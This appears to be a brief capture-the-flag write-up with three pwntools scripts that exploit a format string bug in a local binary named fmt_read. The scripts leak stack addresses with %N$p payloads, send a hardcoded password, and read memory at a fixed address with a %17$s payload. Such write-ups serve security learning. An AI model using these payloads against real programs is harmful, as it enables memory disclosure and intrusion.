# Starting Exploit to find the address leak
    
```python
#!/usr/bin/python3
    
from pwn import *
    
context.log_level = 'error'
for i in range(1,50):
  io = process('./fmt_read')
  payload = f'%{i}$p'
  io.sendline(payload)
  print(io.recvall())
  io.close()
```
    
using the above we will be able to get address leaks from stack

- Second Exploit

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./fmt_read')
    io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
    payload = f'AAAAAAAA.%{i}$p'
    #payload = f'%{i}$p'
    io.sendline(payload)
    print(io.recvall(),i)
    io.close()
```

# Final Exploit

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

io = process('./fmt_read')
io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
payload = b'%17$sAAA' + p64(0x404080)
io.sendline(payload)
print(io.recvall())
io.close()
```
